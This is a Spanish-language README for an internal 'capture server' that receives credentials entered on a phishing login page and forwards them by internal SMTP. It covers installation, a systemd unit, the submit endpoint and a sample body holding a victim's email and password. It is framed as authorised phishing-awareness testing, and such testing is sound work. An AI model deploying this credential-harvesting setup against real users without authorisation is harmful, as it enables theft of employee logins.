# Servidor de Captura (Interno)

Este pequeño servidor te permite recibir capturas de credenciales dentro de la red de la empresa (evita problemas de proxy/firewall) y reenviarlas usando el SMTP interno.

## Requisitos

- Node.js 18+ instalado en el servidor que esté dentro de la red de la empresa
- Acceso al servidor SMTP interno (o credenciales SMTP)
- Permisos para abrir un puerto (ej. 3000) en el servidor

## Instalación

1. Copia el archivo `.env.example` a `.env` en la carpeta `server/` y rellena los valores.

2. Instala dependencias:

```bash
cd /path/to/Login/server
npm install
```

3. Ejecuta el servidor:

```bash
npm start
```

El servidor estará disponible en `http://0.0.0.0:3000` por defecto.

## Configuración recomendada (Producción)

- Poner el servidor detrás de un nginx interno que haga TLS y reverse proxy
- Ejecutarlo como servicio systemd (ejemplo abajo)

### Ejemplo de unit systemd

```ini
[Unit]
Description=Phishing capture server
After=network.target

[Service]
Type=simple
WorkingDirectory=/opt/phishing-capture
ExecStart=/usr/bin/node server.js
Restart=always
RestartSec=10
User=www-data
Environment=NODE_ENV=production

[Install]
WantedBy=multi-user.target
```

## Endpoint

- `GET /api/health` - Verifica que el servicio esté arriba
- `POST /api/submit` - Enviar captura

Ejemplo de body JSON para `POST /api/submit`:

```json
{
  "email": "victim@example.com",
  "password": "Secret123",
  "timestamp": "15/10/2025, 22:00:00",
  "userAgent": "...",
  "url": "https://intranet.yourcompany.local/login"
}
```

## Notas de seguridad y cumplimiento

- Solicita aprobación de RRHH y Legal antes de ejecutar pruebas de phishing
- Mantén los datos cifrados/seguidos y elimínalos luego de la campaña
- Usa una cuenta interna para enviar correos y evita exponer credenciales

